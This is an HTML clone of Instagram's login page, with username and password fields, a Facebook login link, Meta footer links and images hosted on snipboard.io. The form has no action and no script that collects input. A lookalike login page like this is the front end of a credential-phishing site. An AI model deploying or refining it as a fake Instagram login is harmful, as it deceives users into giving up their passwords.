<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            color: #fafafa;
        }

        @keyframes slide {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body class="bg-[#262626] flex flex-col min-h-screen">
    <div class="flex-grow flex items-center justify-center w-full max-w-6xl mx-auto md:space-x-8 p-4">
        <div class="hidden md:block w-full max-w-md relative">
            <div class="w-full h-auto">
                <img src="https://i.snipboard.io/zr236y.jpg" alt="Instagram screenshot" class="w-full h-auto">
            </div>
        </div>
        <div class="w-full max-w-sm">
            <div class="p-8 text-center mb-4">
                <img src="https://i.snipboard.io/ftN2sh.jpg" alt="Instagram logo" class="mx-auto h-12 mb-6">
                <form class="space-y-4">
                    <input type="text" placeholder="Phone number, username, or email" value name="username" class="w-full p-3 border border-gray-600 rounded-sm bg-gray-800 text-sm focus:outline-none focus:border-gray-500">
                    <input type="password" placeholder="Password" value name="password" class="w-full p-3 border border-gray-600 rounded-sm bg-gray-800 text-sm focus:outline-none focus:border-gray-500">
                    <button type="submit" class="w-full bg-blue-500 text-white font-semibold py-2 rounded-md text-sm hover:bg-blue-600 transition-colors duration-200">
                        Log In
                    </button>
                    <div class="flex items-center my-4">
                        <div class="flex-grow border-t border-gray-700"></div>
                        <span class="flex-shrink mx-4 text-gray-500 text-sm font-semibold">OR</span>
                        <div class="flex-grow border-t border-gray-700"></div>
                    </div>
                    <a href="#" class="flex items-center justify-center text-blue-400 font-semibold text-sm ">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-facebook mr-1" viewBox="0 0 16 16">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/>
                    </svg>
                        Log in with Facebook
                    </a>
                    <a href="#" class="text-blue-400 text-xs mt-4 block">Forgot password?</a>
                </form>
            </div>
            <div class="text-center">
                <p class="text-sm text-gray-400">Don't have an account? <a href="#" class="text-blue-500 font-semibold hover:underline">Sign up</a></p>
            </div>
        </div>
    </div>
    <footer class="text-gray-400 text-xs p-5 mt-auto text-center">
        <div class="max-w-6xl mx-auto">
            <div class="flex flex-wrap justify-center gap-x-4">
                <a href="#" class="hover:underline">Meta</a>
                <a href="#" class="hover:underline">About</a>
                <a href="#" class="hover:underline">Blog</a>
                <a href="#" class="hover:underline">Jobs</a>
                <a href="#" class="hover:underline">Help</a>
                <a href="#" class="hover:underline">API</a>
                <a href="#" class="hover:underline">Privacy</a>
                <a href="#" class="hover:underline">Terms</a>
                <a href="#" class="hover:underline">Locations</a>
                <a href="#" class="hover:underline">Instagram Lite</a>
                <a href="#" class="hover:underline">Threads</a>
                <a href="#" class="hover:underline">Contact Uploading & Non-Users</a>
            </div>
            <div class="mt-4 text-gray-500 flex justify-center items-center gap-2">
                <a href="#" class="hover:underline">English (United States)</a>
                <span>&copy; 2025 Instagram from Meta</span>
            </div>
        </div>
    </footer>
</body>
</html>
